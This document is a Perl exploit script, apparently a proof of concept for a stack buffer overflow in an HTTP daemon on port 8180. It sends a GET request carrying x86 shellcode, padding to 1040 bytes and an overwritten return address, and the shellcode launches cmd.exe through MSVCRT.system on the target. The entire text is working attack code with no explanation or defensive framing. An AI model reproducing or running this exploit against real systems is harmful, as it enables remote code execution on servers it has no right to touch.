#!/usr/bin/perl
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto => "tcp",
                                 PeerAddr => $host,
                                 PeerPort => "8180",
                                 );
unless ($remote) { die "cannot connect to http daemon on $host" }

$remote->autoflush(1);

$shellcode = join ("",
"\x90", # - NOP
"\xCC", # - INT3
"\x90", # - NOP
"\x90", # - NOP
"\x90", # - NOP
"\x90", # - NOP
"\x8B\xEC", # - MOV EBP, ESP
"\x55", # - PUSH EBP
"\x8B\xEC", # - MOV EBP, ESP
"\x33\xFF", # - XOR EDI, EDI
"\x57", # - PUSH EDI
"\x83\xEC\x04", # 0 SUB ESP, 4
"\xC6\x45\xF8\x63", # - MOV BYTE PTR SS:[EBP-8],63h
"\xC6\x45\xF9\x6D", # - MOV BYTE PTR SS:[EBP-7],6Dh
"\xC6\x45\xFA\x64", # - MOV BYTE PTR SS:[EBP-6],64h
"\xC6\x45\xFB\x2E", # - MOV BYTE PTR SS:[EBP-5],2Eh
"\xC6\x45\xFC\x65", # - MOV BYTE PTR SS:[EBP-4],65h
"\xC6\x45\xFD\x78", # - MOV BYTE PTR SS:[EBP-3],78h
"\xC6\x45\xFE\x65", # - MOV BYTE PTR SS:[EBP-2],65h
"\xB8\xC3\xAF\x01\x78", # - MOV EAX, MSVCRT.system
"\x50", # - PUSH EAX
"\x8D\x45\xF8", # - LEA EAX, DWORD PTR SS:[EBP-8]
"\x50", # - PUSH EAX
"\xFF\x55\xF4", # - CALL DWORD PTR SS:[EBP-C]
"\x5F" # - POP EDI
);

$eip = "\x4c\xf8\x12";

#0012f84C

#$eip = "AAAA";
$request = join ("", "GET /", $shellcode, "A"x(1040-length($shellcode)),
$eip, " HTTP/1.1\r
Host: $host\r
Connection: close\r
\r
\r\n");

print $remote $request;
sleep(1);

close $remote;

